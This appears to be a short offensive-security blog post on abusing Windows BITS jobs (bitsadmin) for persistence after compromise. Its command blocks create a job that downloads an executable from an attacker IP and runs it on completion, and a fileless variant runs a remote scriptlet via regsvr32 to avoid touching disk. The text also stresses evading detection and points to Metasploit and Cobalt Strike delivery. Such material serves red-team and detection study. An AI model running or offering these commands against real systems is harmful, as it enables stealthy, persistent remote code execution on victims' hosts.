---
layout: single
classes: wide
title: BITS Persistence
excerpt: "Using BITSadmin for persistence"
date: 2020-09-27
tags: [windows persistence]
---

# BITS
## What is BITS job?
BITS or also known as Background Intelligent Transfer Service is a application that is used to download or upload files to two protocols which are HTTP web servers and SMB. BITS is also used to update other applications. 

One of the key feautures of BITS is that it allows download in the background and once a connection has been established it won't get disconnect unless the user logout or rebooted and when the network connection is off. It's also interesting to mention that BITS will reestablished the connection that has been lost due to circumstances for instance network connection was turned off, or the user rebooted or logout.

## Using BITS as a persistence tactic.
In the hacker's view or the offensive side, this can be abused to download payloads or tools that they require, It is also worth to mention that there's a highly chance of not getting detected when using this as there are also legitimate applications that use this so we just need to blend in with the environment. However, using BITS requires administration privileges on the compromised host.

### To download and execute:
```
bitsadmin /create shell
bitsadmin /addfile shell "http://192.168.1.43/shen.exe"  "C:\tmp\shen.exe"
bitsadmin /SetNotifyCmdLine shell C:\tmp\shen.exe NULL
bitsadmin /SetMinRetryDelay "shell" 60
bitsadmin /resume shell
```
1. The `/create` parameter is used to specify what type of jobs you want to create and the name of the job when not specifying the type it will default to `Download`. `bitsadmin /create [type] displayname`
2. The `/addfile` parameter is used to add a file into a specific job which as a value we can add the name of the job, a remoteURL that contains a file or a local file and the output name and location. `bitsadmin /addfile <job> <remoteURL> <localname>`
3. The `/SetNotifyCmdLine` parameter is used to run a cli command after a job was done transferring data. `bitsadmin /setnotifycmdline <job> <program_name> [program_parameters]
`
4. The `/SetMinRetryDelay` parameter is used to set how many seconds to wait before retrying to download a file once again that failed. `bitsadmin /setminretrydelay <job> <retrydelay>
`
5. The `/resume` parameter is used to activate the job. 
	`bitsadmin /resume <job>`
	
It is also possible to execute a scriptlet from a remote host via the regsvr32 through `SetNotifyCmdLine` to avoid touching the disk.
```
bitsadmin /SetNotifyCmdLine shell regsvr32.exe "/s /n /u /i:http://192.168.1.43/FHXSd9.sct scrobj.dll"
bitsadmin /resume shell
```

The metasploit module `exploit/multi/script/web_delivery` uses regsvr32 to deliver payloads. And it is also possible to generate one for cobalt strike through aggressor scripts.
	
## Resources:
https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md
https://pentestlab.blog/2019/10/30/persistence-bits-jobs/
http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html
